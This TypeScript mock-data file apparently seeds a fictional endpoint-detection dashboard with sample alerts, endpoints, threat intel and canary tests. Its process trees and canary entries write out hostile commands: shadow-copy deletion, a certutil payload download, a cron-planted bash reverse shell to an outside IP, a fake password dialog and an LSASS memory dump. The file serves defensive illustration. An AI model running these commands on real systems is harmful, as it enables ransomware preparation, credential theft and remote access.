import { Alert, Endpoint, ThreatFeedItem, CanaryTest, SocMessage } from '../types/edr';

export const INITIAL_ALERTS: Alert[] = [
  {
    id: 'ALT-8821',
    title: 'Shadow Copy Deletion (Ransomware Precursor Activity)',
    severity: 'critical',
    status: 'action_required',
    timestamp: '2026-09-28 23:42:18 UTC',
    endpointId: 'EP-WIN-003',
    endpointName: 'ACCT-WORKSTATION-01',
    endpointUser: 'd.clarkson (Accounting)',
    endpointIp: '192.168.10.45',
    os: 'windows',
    techniqueId: 'T1490',
    techniqueName: 'Inhibit System Recovery',
    tactic: 'Impact',
    socSummary:
      'A weaponized Excel invoice attachment spawned cmd.exe which attempted to execute vssadmin.exe to purge local Volume Shadow Copies. SentinelLite agent suspended the child process before encryption commenced.',
    businessRisk:
      'High likelihood of imminent ransomware deployment targeting financial ledgers and tax records. If shadow copies are erased, backup restoration becomes the only recovery route.',
    socAnalyst: {
      name: 'Sarah Vance, GIAC GCDA',
      role: 'Lead Managed SOC Analyst',
      avatar: 'SV',
      notes:
        'I reviewed the process lineage. The user opened "Invoice_Overdue_Sept2026.xlsm" from Outlook. The macro dropped an obfuscated batch payload in C:\\Users\\d.clarkson\\AppData\\Local\\Temp. I have staged network isolation pending your 1-click confirmation.',
      verifiedAt: '2026-09-28 23:44:05 UTC',
    },
    recommendedActions: [
      'Isolate endpoint ACCT-WORKSTATION-01 immediately to prevent lateral SMB propagation.',
      'Terminate the parent Excel process tree and quarantine temp batch dropper.',
      'Restore corrupted registry hives from local immutable snapshot.',
      'Block destination IP 185.220.101.44 at the gateway and push IoC to all fleet endpoints.'
    ],
    remediationStatus: {
      isolated: false,
      processKilled: true,
      snapshotReverted: false,
      iocBlocked: false,
    },
    processTree: {
      id: 'p-1',
      name: 'excel.exe',
      pid: 6184,
      commandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" /e "C:\\Users\\d.clarkson\\Downloads\\Invoice_Overdue_Sept2026.xlsm"',
      user: 'ACCT\\d.clarkson',
      children: [
        {
          id: 'p-2',
          name: 'cmd.exe',
          pid: 8840,
          commandLine: 'cmd.exe /c "C:\\Users\\d.clarkson\\AppData\\Local\\Temp\\sc_del.bat"',
          user: 'ACCT\\d.clarkson',
          isMalicious: true,
          children: [
            {
              id: 'p-3',
              name: 'vssadmin.exe',
              pid: 9112,
              commandLine: 'vssadmin.exe delete shadows /all /quiet',
              user: 'ACCT\\d.clarkson',
              isMalicious: true,
            },
            {
              id: 'p-4',
              name: 'powershell.exe',
              pid: 9140,
              commandLine: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA==',
              user: 'ACCT\\d.clarkson',
              isMalicious: true,
            }
          ]
        }
      ]
    },
    fileHash: {
      sha256: '9a3f81e7d80c32b509f6e2dc08ef128a3f9901b04b90ec22a10dfa48c903a451',
      md5: '7d32c4819aa01825b0198de7e91244ab',
      fileName: 'Invoice_Overdue_Sept2026.xlsm',
      filePath: 'C:\\Users\\d.clarkson\\Downloads\\Invoice_Overdue_Sept2026.xlsm',
      vtDetections: '47 / 72 Security Vendors',
    },
    networkConnections: [
      {
        protocol: 'TCP',
        sourceIp: '192.168.10.45',
        sourcePort: 54128,
        destinationIp: '185.220.101.44',
        destinationPort: 443,
        destinationCountry: 'Netherlands (Tor Exit)',
        reputation: 'malicious',
      }
    ]
  },
  {
    id: 'ALT-8819',
    title: 'Living-off-the-Land Binary Execution (CertUtil Download)',
    severity: 'high',
    status: 'soc_investigating',
    timestamp: '2026-09-28 22:15:33 UTC',
    endpointId: 'EP-WIN-001',
    endpointName: 'OFFICE-FILESRV-01',
    endpointUser: 'SYSTEM (Service Account)',
    endpointIp: '192.168.10.5',
    os: 'windows',
    techniqueId: 'T1105',
    techniqueName: 'Ingress Tool Transfer (LOLBin)',
    tactic: 'Command & Control',
    socSummary:
      'Windows native certutil.exe was invoked with the -urlcache parameter to retrieve an executable payload disguised as an SSL certificate from an anomalous external host.',
    businessRisk:
      'Attacker bypassing perimeter firewall inspection by abusing trusted native Microsoft binaries to stage secondary remote access utilities.',
    socAnalyst: {
      name: 'Marcus Chen, OSCP',
      role: 'Tier 2 SOC Detection Engineer',
      avatar: 'MC',
      notes:
        'The certutil process was automatically halted by our kernel eBPF driver before file write finished. The remote IP is associated with recent DarkGate malspam campaigns targeting SMB legal firms.',
      verifiedAt: '2026-09-28 22:18:10 UTC',
    },
    recommendedActions: [
      'Confirm process termination and verify no persistence tasks were scheduled.',
      'Blacklist the payload URL across DNS resolver.',
      'Verify scheduled tasks on OFFICE-FILESRV-01.'
    ],
    remediationStatus: {
      isolated: false,
      processKilled: true,
      snapshotReverted: false,
      iocBlocked: true,
    },
    processTree: {
      id: 'p-10',
      name: 'services.exe',
      pid: 792,
      commandLine: 'C:\\Windows\\system32\\services.exe',
      user: 'NT AUTHORITY\\SYSTEM',
      children: [
        {
          id: 'p-11',
          name: 'certutil.exe',
          pid: 4104,
          commandLine: 'certutil.exe -urlcache -split -f "https://cdn-updates-win.online/patch.bin" C:\\Windows\\Temp\\update_sec.exe',
          user: 'NT AUTHORITY\\SYSTEM',
          isMalicious: true,
        }
      ]
    },
    fileHash: {
      sha256: '41efc88219199a0bba8120c909ee8834920a112df88491cba908754123561a0f',
      md5: '882c9182a47210e71954f9a03b51b329',
      fileName: 'patch.bin',
      filePath: 'C:\\Windows\\Temp\\update_sec.exe',
      vtDetections: '52 / 71 Security Vendors',
    },
    networkConnections: [
      {
        protocol: 'TCP',
        sourceIp: '192.168.10.5',
        sourcePort: 49812,
        destinationIp: '194.26.29.112',
        destinationPort: 443,
        destinationCountry: 'Bulgaria',
        reputation: 'malicious',
      }
    ]
  },
  {
    id: 'ALT-8812',
    title: 'Suspicious RDP Login from Non-Standard Subnet',
    severity: 'medium',
    status: 'contained',
    timestamp: '2026-09-28 19:40:02 UTC',
    endpointId: 'EP-WIN-002',
    endpointName: 'POS-TERMINAL-02',
    endpointUser: 'store.cashier (Local)',
    endpointIp: '192.168.20.12',
    os: 'windows',
    techniqueId: 'T1078',
    techniqueName: 'Valid Accounts: Remote Services',
    tactic: 'Initial Access',
    socSummary:
      'Over 14 failed RDP authentication attempts in 40 seconds followed by a successful login from an unauthorized residential IP. SentinelLite auto-locked the terminal session.',
    businessRisk:
      'Risk of credit card skimmer or memory scraper injection into Point of Sale transaction software.',
    socAnalyst: {
      name: 'Sarah Vance, GIAC GCDA',
      role: 'Lead Managed SOC Analyst',
      avatar: 'SV',
      notes:
        'IP geolocated to Romania with known Shodan scanner reputation. The local cashier password was trivially guessable ("Store2026!"). SentinelLite automatically revoked the session and enforced local network isolation.',
      verifiedAt: '2026-09-28 19:42:30 UTC',
    },
    recommendedActions: [
      'Keep terminal isolated until password reset is executed.',
      'Disable remote RDP access directly on retail VLAN; mandate Tailscale/WireGuard VPN.'
    ],
    remediationStatus: {
      isolated: true,
      processKilled: true,
      snapshotReverted: false,
      iocBlocked: true,
    },
    processTree: {
      id: 'p-20',
      name: 'svchost.exe',
      pid: 1420,
      commandLine: 'C:\\Windows\\System32\\svchost.exe -k TermSVCS',
      user: 'NT AUTHORITY\\NETWORK SERVICE',
      children: [
        {
          id: 'p-21',
          name: 'rdpclip.exe',
          pid: 3048,
          commandLine: 'rdpclip.exe',
          user: 'POS\\store.cashier',
          isMalicious: false,
        }
      ]
    },
    fileHash: {
      sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      md5: 'd41d8cd98f00b204e9800998ecf8427e',
      fileName: 'N/A (Authentication event)',
      filePath: 'N/A',
      vtDetections: 'N/A',
    },
    networkConnections: [
      {
        protocol: 'TCP',
        sourceIp: '192.168.20.12',
        sourcePort: 3389,
        destinationIp: '89.44.195.22',
        destinationPort: 49150,
        destinationCountry: 'Romania',
        reputation: 'malicious',
      }
    ]
  },
  {
    id: 'ALT-8804',
    title: 'Cron Job Persistence Injection via Hidden Script',
    severity: 'medium',
    status: 'resolved',
    timestamp: '2026-09-28 14:12:08 UTC',
    endpointId: 'EP-LNX-001',
    endpointName: 'PROD-NGINX-EDGE',
    endpointUser: 'www-data',
    endpointIp: '192.168.10.88',
    os: 'linux',
    techniqueId: 'T1053.003',
    techniqueName: 'Scheduled Task/Job: Cron',
    tactic: 'Persistence',
    socSummary:
      'Attempt to append a reverse shell invocation into /etc/cron.d/cert-renew by a compromised web service process. SentinelLite eBPF probe rejected the write operation.',
    businessRisk:
      'Long-term backdoor into SMB edge web server, risking customer portal database compromise.',
    socAnalyst: {
      name: 'Marcus Chen, OSCP',
      role: 'Tier 2 SOC Detection Engineer',
      avatar: 'MC',
      notes:
        'Exploited via outdated WordPress plugin. The write was blocked in kernel space. Remediated with customer IT: plugin updated, web process sanitized.',
      verifiedAt: '2026-09-28 14:15:22 UTC',
    },
    recommendedActions: [
      'Patch vulnerable WP plugin.',
      'Maintain cron file tamper guard enabled.'
    ],
    remediationStatus: {
      isolated: false,
      processKilled: true,
      snapshotReverted: false,
      iocBlocked: true,
    },
    processTree: {
      id: 'p-30',
      name: 'nginx',
      pid: 2210,
      commandLine: 'nginx: worker process',
      user: 'www-data',
      children: [
        {
          id: 'p-31',
          name: 'php-fpm',
          pid: 3108,
          commandLine: 'php-fpm: pool www',
          user: 'www-data',
          children: [
            {
              id: 'p-32',
              name: 'sh',
              pid: 4412,
              commandLine: 'sh -c echo "*/5 * * * * /bin/bash -i >& /dev/tcp/91.240.118.5/4444 0>&1" > /etc/cron.d/cert-renew',
              user: 'www-data',
              isMalicious: true,
            }
          ]
        }
      ]
    },
    fileHash: {
      sha256: '772b1448bc900ef2a91295b9d3118cf982a1548e66324b104ad5a13346912389',
      md5: '9a912bb0981e7d82531a890123efb982',
      fileName: 'cert-renew (cron stub)',
      filePath: '/etc/cron.d/cert-renew',
      vtDetections: '38 / 69 Security Vendors',
    },
    networkConnections: [
      {
        protocol: 'TCP',
        sourceIp: '192.168.10.88',
        sourcePort: 38810,
        destinationIp: '91.240.118.5',
        destinationPort: 4444,
        destinationCountry: 'Russia',
        reputation: 'malicious',
      }
    ]
  },
  {
    id: 'ALT-8798',
    title: 'Suspicious Terminal Osascript Permission Prompt',
    severity: 'low',
    status: 'resolved',
    timestamp: '2026-09-28 09:20:11 UTC',
    endpointId: 'EP-MAC-001',
    endpointName: 'EXEC-MACBOOK-AIR',
    endpointUser: 'r.thorne (CEO)',
    endpointIp: '192.168.10.104',
    os: 'macos',
    techniqueId: 'T1548.004',
    techniqueName: 'Abuse Elevation Control Mechanism: Sudo and Sudoers',
    tactic: 'Privilege Escalation',
    socSummary:
      'Fake macOS system dialog spawned via osascript attempting to capture root password during a developer tool installation.',
    businessRisk:
      'Credential theft on executive workstation with access to banking portals and confidential contracts.',
    socAnalyst: {
      name: 'Sarah Vance, GIAC GCDA',
      role: 'Lead Managed SOC Analyst',
      avatar: 'SV',
      notes:
        'Dialog was dismissed and the installer script quarantined. Executive informed and safe browsing guidelines refreshed.',
      verifiedAt: '2026-09-28 09:25:00 UTC',
    },
    recommendedActions: [
      'Enforce managed configuration profile preventing unsigned .pkg launches.'
    ],
    remediationStatus: {
      isolated: false,
      processKilled: true,
      snapshotReverted: false,
      iocBlocked: false,
    },
    processTree: {
      id: 'p-40',
      name: 'Terminal',
      pid: 1842,
      commandLine: '/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal',
      user: 'r.thorne',
      children: [
        {
          id: 'p-41',
          name: 'osascript',
          pid: 3120,
          commandLine: 'osascript -e \'display dialog "macOS requires your password to continue" default answer "" with hidden answer\'',
          user: 'r.thorne',
          isMalicious: true,
        }
      ]
    },
    fileHash: {
      sha256: '992a884b238f9012a912bb0981e7d82531a890123efb982772b1448bc900ef2a',
      md5: '7d82531a890123efb982772b1448bc90',
      fileName: 'helper_prompt.scpt',
      filePath: '/Users/r.thorne/Downloads/helper_prompt.scpt',
      vtDetections: '29 / 68 Security Vendors',
    },
    networkConnections: []
  }
];

export const INITIAL_ENDPOINTS: Endpoint[] = [
  {
    id: 'EP-WIN-001',
    hostname: 'OFFICE-FILESRV-01',
    user: 'SYSTEM',
    department: 'Core Infrastructure',
    os: 'windows',
    osVersion: 'Windows Server 2022 Datacenter',
    ip: '192.168.10.5',
    publicIp: '54.218.99.12',
    agentVersion: 'v2.8.4-ebpf',
    agentMemoryMb: 11.4,
    agentCpuPercent: 0.3,
    status: 'protected',
    lastHeartbeat: '6s ago',
    tamperProtection: true,
    activeAlertsCount: 0,
    uptimeDays: 142,
    assignedPolicy: 'Strict Server Hardening + VSS Protection',
  },
  {
    id: 'EP-WIN-002',
    hostname: 'POS-TERMINAL-02',
    user: 'store.cashier',
    department: 'Retail Floor',
    os: 'windows',
    osVersion: 'Windows 11 Pro 23H2',
    ip: '192.168.20.12',
    publicIp: '54.218.99.12',
    agentVersion: 'v2.8.4-ebpf',
    agentMemoryMb: 9.8,
    agentCpuPercent: 0.2,
    status: 'isolated',
    lastHeartbeat: '12s ago',
    tamperProtection: true,
    activeAlertsCount: 1,
    uptimeDays: 28,
    assignedPolicy: 'Kiosk PCI-DSS Lockdown',
  },
  {
    id: 'EP-WIN-003',
    hostname: 'ACCT-WORKSTATION-01',
    user: 'd.clarkson',
    department: 'Accounting & Payroll',
    os: 'windows',
    osVersion: 'Windows 11 Pro 23H2',
    ip: '192.168.10.45',
    publicIp: '54.218.99.12',
    agentVersion: 'v2.8.4-ebpf',
    agentMemoryMb: 13.1,
    agentCpuPercent: 0.6,
    status: 'warning',
    lastHeartbeat: '2s ago',
    tamperProtection: true,
    activeAlertsCount: 1,
    uptimeDays: 14,
    assignedPolicy: 'Financial Standard + Ransomware Canary',
  },
  {
    id: 'EP-MAC-001',
    hostname: 'EXEC-MACBOOK-AIR',
    user: 'r.thorne',
    department: 'Executive Office',
    os: 'macos',
    osVersion: 'macOS Sequoia 15.1',
    ip: '192.168.10.104',
    publicIp: '54.218.99.12',
    agentVersion: 'v2.8.4-es',
    agentMemoryMb: 14.8,
    agentCpuPercent: 0.4,
    status: 'protected',
    lastHeartbeat: '8s ago',
    tamperProtection: true,
    activeAlertsCount: 0,
    uptimeDays: 9,
    assignedPolicy: 'Executive Mobile Shield',
  },
  {
    id: 'EP-LNX-001',
    hostname: 'PROD-NGINX-EDGE',
    user: 'www-data',
    department: 'Web & API Services',
    os: 'linux',
    osVersion: 'Ubuntu 24.04 LTS (Kernel 6.8)',
    ip: '192.168.10.88',
    publicIp: '143.198.72.10',
    agentVersion: 'v2.8.4-ebpf',
    agentMemoryMb: 8.2,
    agentCpuPercent: 0.1,
    status: 'protected',
    lastHeartbeat: '4s ago',
    tamperProtection: true,
    activeAlertsCount: 0,
    uptimeDays: 89,
    assignedPolicy: 'Linux Container & Kernel Ring0 Defense',
  },
  {
    id: 'EP-WIN-004',
    hostname: 'DESK-WAREHOUSE-01',
    user: 'j.miller',
    department: 'Logistics & Inventory',
    os: 'windows',
    osVersion: 'Windows 10 Enterprise LTSC',
    ip: '192.168.20.55',
    publicIp: '54.218.99.12',
    agentVersion: 'v2.8.4-ebpf',
    agentMemoryMb: 10.5,
    agentCpuPercent: 0.2,
    status: 'protected',
    lastHeartbeat: '15s ago',
    tamperProtection: true,
    activeAlertsCount: 0,
    uptimeDays: 62,
    assignedPolicy: 'Standard Endpoint Baseline',
  },
  {
    id: 'EP-MAC-002',
    hostname: 'DEV-STUDIO-MAC',
    user: 'a.turing',
    department: 'Software Engineering',
    os: 'macos',
    osVersion: 'macOS Sonoma 14.5',
    ip: '192.168.10.118',
    publicIp: '54.218.99.12',
    agentVersion: 'v2.8.4-es',
    agentMemoryMb: 15.2,
    agentCpuPercent: 0.5,
    status: 'protected',
    lastHeartbeat: '18s ago',
    tamperProtection: true,
    activeAlertsCount: 0,
    uptimeDays: 21,
    assignedPolicy: 'Developer Sandbox (Loose Compiler Filter)',
  }
];

export const THREAT_INTEL_FEED: ThreatFeedItem[] = [
  {
    id: 'INTEL-01',
    ioc: '185.220.101.44',
    type: 'ip',
    source: 'AlienVault OTX',
    malwareFamily: 'LockBit 3.0 / BlackCat Precursor C2',
    severity: 'critical',
    firstSeen: '24 hours ago',
    description: 'Active bulletproof hosting C2 IP delivering secondary stage ransom note generators via PowerShell.',
    matchedEndpointsCount: 1,
  },
  {
    id: 'INTEL-02',
    ioc: 'CVE-2024-1709',
    type: 'cve',
    source: 'CISA KEV',
    malwareFamily: 'ConnectWise ScreenConnect Auth Bypass',
    severity: 'critical',
    firstSeen: 'Updated 2026-09-25',
    description: 'Ransomware actors actively weaponizing setup wizard path traversal to create rogue admin accounts on SMB MSP instances.',
    matchedEndpointsCount: 0,
  },
  {
    id: 'INTEL-03',
    ioc: '9a3f81e7d80c32b509f6e2dc08ef128a3f9901b04b90ec22a10dfa48c903a451',
    type: 'sha256',
    source: 'VirusTotal Intelligence',
    malwareFamily: 'DarkGate Loader Dropper',
    severity: 'high',
    firstSeen: '3 days ago',
    description: 'Malicious VBA macro inside mock invoice XLS spreadsheets extracting encrypted CAB payloads via CertUtil.',
    matchedEndpointsCount: 1,
  },
  {
    id: 'INTEL-04',
    ioc: 'cdn-updates-win.online',
    type: 'domain',
    source: 'SMB Ransomware Watch',
    malwareFamily: 'AsyncRAT Dynamic DNS',
    severity: 'high',
    firstSeen: '18 hours ago',
    description: 'Typosquatted domain mimicking legitimate Windows update CDN; drops remote administrative trojans into %TEMP%.',
    matchedEndpointsCount: 1,
  },
  {
    id: 'INTEL-05',
    ioc: '91.240.118.5',
    type: 'ip',
    source: 'AlienVault OTX',
    malwareFamily: 'Mirai / Linux Mirai-Variant Scanner',
    severity: 'medium',
    firstSeen: '6 hours ago',
    description: 'Scanning edge HTTP/HTTPS endpoints for unauthenticated web shell execution via PHP vulnerabilities.',
    matchedEndpointsCount: 1,
  },
  {
    id: 'INTEL-06',
    ioc: 'CVE-2023-46805',
    type: 'cve',
    source: 'CISA KEV',
    malwareFamily: 'Ivanti Connect Secure Authentication Bypass',
    severity: 'critical',
    firstSeen: 'Updated 2026-09-20',
    description: 'Critical authentication bypass in web components leading to root shell command execution.',
    matchedEndpointsCount: 0,
  }
];

export const CANARY_TESTS: CanaryTest[] = [
  {
    id: 'canary-1',
    name: 'Ransomware Tripwire (VSS Shadow Copy Deletion Probe)',
    tactic: 'Impact (T1490)',
    mitreRef: 'MITRE ATT&CK T1490',
    description: 'Tests whether the SentinelLite lightweight agent immediately intercepts unauthorized invocation of vssadmin.exe or wmic shadowcopy delete before files can be touched.',
    simulatedCommand: 'vssadmin.exe delete shadows /all /quiet [SIMULATED_TEST_TOKEN_SENTINEL]',
    safePayloadDetails: 'Executes benign flag verification with dummy token; no actual volume shadow copies are touched.',
    expectedDetection: 'Zero-latency process halt + Managed SOC alert generation + endpoint containment prompt.'
  },
  {
    id: 'canary-2',
    name: 'Living-off-the-Land (CertUtil Payload Staging)',
    tactic: 'Command & Control (T1105)',
    mitreRef: 'MITRE ATT&CK T1105',
    description: 'Tests detection of legitimate system binaries (certutil, bitsadmin) reaching out to unapproved external endpoints to fetch executable binaries.',
    simulatedCommand: 'certutil.exe -urlcache -split -f "https://sentinel-canary.internal/test.bin" C:\\Temp\\canary.tmp',
    safePayloadDetails: 'Points to an internal harmless JSON metadata beacon containing zero payload code.',
    expectedDetection: 'Ingress Tool Transfer heuristic detection + Process Lineage correlation.'
  },
  {
    id: 'canary-3',
    name: 'LSASS Memory Dumping Evasion (Mimikatz Precursor)',
    tactic: 'Credential Access (T1003.001)',
    mitreRef: 'MITRE ATT&CK T1003.001',
    description: 'Evaluates kernel-level tamper protection when an unauthorized thread attempts to open a handle with PROCESS_VM_READ access to Local Security Authority Subsystem Service.',
    simulatedCommand: 'rundll32.exe comsvcs.dll MiniDump [LSASS_MOCK_PID] canary.dmp full',
    safePayloadDetails: 'Targets an isolated mock test service PID, validating that kernel eBPF driver strips handle access.',
    expectedDetection: 'Immediate kernel-level handle strip + Critical credential theft alert.'
  },
  {
    id: 'canary-4',
    name: 'Stealth Persistence via Scheduled Task / Cron',
    tactic: 'Persistence (T1053)',
    mitreRef: 'MITRE ATT&CK T1053',
    description: 'Tests behavioral detection of suspicious hidden scheduled tasks or cron injections spawned from interactive shell sessions.',
    simulatedCommand: 'schtasks /create /sc minute /mo 15 /tn "SystemHealthSentinelProbe" /tr "cmd.exe /c exit 0"',
    safePayloadDetails: 'Creates an ephemeral test task that auto-purges after detection signal verification.',
    expectedDetection: 'Tamper protection warning + persistence audit entry.'
  }
];

export const INITIAL_SOC_MESSAGES: SocMessage[] = [
  {
    id: 'msg-1',
    sender: 'soc_analyst',
    senderName: 'Sarah Vance, GIAC GCDA (Lead SOC Analyst)',
    timestamp: '23:44 UTC',
    text: 'Hello Team, this is Sarah from the 24/7 Managed SOC. We intercepted a high-confidence ransomware precursor on ACCT-WORKSTATION-01 (vssadmin delete shadows). The agent has suspended the child process. Would you like us to isolate the machine while we verify if any network shares were accessed?',
    actionRecommendation: 'Isolate ACCT-WORKSTATION-01'
  },
  {
    id: 'msg-2',
    sender: 'user',
    senderName: 'Alex Reynolds (IT Generalist)',
    timestamp: '23:46 UTC',
    text: 'Hi Sarah! Yes please isolate it right away. Clarkson in accounting mentioned opening an email from what she thought was a vendor 15 minutes ago.',
  },
  {
    id: 'msg-3',
    sender: 'soc_analyst',
    senderName: 'Sarah Vance, GIAC GCDA (Lead SOC Analyst)',
    timestamp: '23:47 UTC',
    text: 'Understood Alex. Machine isolation is ready to be confirmed via your 1-click prompt. We have already correlated the sender domain against our global threat feeds and pushed a fleet-wide block for IP 185.220.101.44. No file encryption occurred.',
    actionRecommendation: 'Execute Fleet-wide IoC Block'
  }
];
